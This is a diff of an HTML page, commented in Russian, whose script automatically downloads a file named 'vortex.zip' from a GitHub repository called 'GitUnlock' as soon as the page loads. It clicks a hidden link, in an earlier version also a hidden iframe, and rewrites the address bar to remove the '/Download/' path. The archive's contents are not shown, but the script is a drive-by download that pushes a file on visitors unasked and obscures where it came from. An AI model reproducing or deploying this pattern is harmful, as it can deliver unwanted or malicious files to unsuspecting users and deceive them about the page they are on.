@@ -42,38 +42,33 @@
     <div class="loader"></div>
 
     <script>
-        // Функция для очистки URL от /Download/
-        function cleanUrl() {
-            const url = window.location.href;
-            if (url.includes('/Download/')) {
-                const cleanUrl = url.replace('/Download/', '/');
-                history.replaceState(null, null, cleanUrl);
-            }
-        }
-
-        // Надежная функция скачивания файла
-        function downloadFile() {
-            cleanUrl(); // Очищаем URL сразу
+        // Проверяем, было ли уже скачивание
+        if (!sessionStorage.getItem('fileDownloaded')) {
+            sessionStorage.setItem('fileDownloaded', 'true');
             
-            // Создаем iframe для скачивания
-            const iframe = document.createElement('iframe');
-            iframe.src = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
+            // Очищаем URL от /Download/
+            const cleanUrl = () => {
+                const url = window.location.href;
+                if (url.includes('/Download/')) {
+                    history.replaceState(null, null, url.replace('/Download/', '/'));
+                }
+            };
             
-            // Альтернативный метод через ссылку
-            setTimeout(() => {
+            // Скачиваем файл ОДИН РАЗ
+            const downloadFile = () => {
+                cleanUrl();
                 const link = document.createElement('a');
                 link.href = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
                 link.download = 'vortex.zip';
+                link.style.display = 'none';
                 document.body.appendChild(link);
                 link.click();
                 setTimeout(() => document.body.removeChild(link), 100);
-            }, 500);
+            };
+            
+            // Запускаем скачивание с небольшой задержкой
+            setTimeout(downloadFile, 300);
         }
-
-        // Запускаем скачивание сразу
-        downloadFile();
     </script>
 </body>
 </html>
